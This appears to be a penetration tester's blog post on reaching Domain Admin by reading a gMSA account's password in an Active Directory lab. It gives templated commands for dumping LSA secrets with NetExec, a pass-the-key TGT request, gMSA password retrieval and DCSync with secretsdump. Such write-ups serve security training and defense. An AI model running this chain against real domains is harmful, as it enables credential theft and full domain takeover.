---
title: "Retrieving gMSA Password"
date: 2024-11-10
categories: [DACL]
tags: []
---

During a pentest engagement I had the chance to escalate to Domain Admin privileges by an alternative path. Retrieving the gMSA password of a service account that had DCSync privileges.

## Definition

In order to make service accounts safer, Group Managed Service Accounts (gMSA) were introduced with Windows Server 2012. User accounts used for services rather than by humans frequently need specific or elevated privileges, and their passwords are rarely changed. They are also frequently exempt from the password policy.

GMSA is managed automatically, so administrators don't have to worry about changing passwords because each service account is assigned a very complex, one-of-a-kind password every 30 days. This enables administrators to run multiple service instances on different hosts with the same domain account.

The following BloodHound path shows that the computer ad.lab\PC02$ has the ReadGMSAPassword DACL assigned. This grants the computer the right to read the password of the service accoun named gmsa-svc$. The service account is allowed to DCSync.

![outbound](/assets/blog/outbound/image-1.jpg)

## Collecting Secrets

As the current computer has the privilege to read the password, we require a method of authentication. NetExec can be used to dump LSA Secrets from memory. They are kept in the registry hive:

```Shell
HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets
```

This will allow us to retrieve the computer's or domain's cached credentials, including NTLM hashes, DCC2, Kerberos keys and so on. 

```Shell
nxc smb {Computer} -u {Administrative Account} -p {Password} --local-auth --lsa
```

## Pass-the-key Attack

For OPSec, we could export the KRB5CCNAME environment variable in a .ccache file and request a TGT using the computer account's AES-256 key to perform a Pass-the-key attack. Nevertheless, we have already abandoned OPSec in favor of NetExec. Pick your poison.

```Shell
getTGT.py -aesKey {AES256 Key} '{Domain Name}/{Computer Name $}@{DC IP Address}'
EXPORT KRB5CCNAME='{CCACHE File}'
```

![outbound](/assets/blog/outbound/image-3.jpg)

The password can then be recovered by running NetExec again with the `--gmsa` LDAP module. To use this parameter, LDAPS needs to be configured.

```Shell
nxc ldap {Domain Controller} -k --use-kcache --gmsa
```

![outbound](/assets/blog/outbound/image-4.jpg)

## Secretsdump

Now we are able to dump the Administrator account's NTLM hash because the `gmsa-svc$` account has DCSync rights. At this point we have complete access to the windows domain.

```Shell
secretsdump.py '{Domain Name}/{User with DCSync Rights}@{DC IP Address}' 
-just-dc-user Administrator -hashes :{LM:NT}
```

![outbound](/assets/blog/outbound/image-5.jpg)

At this point we have complete access to the windows domain.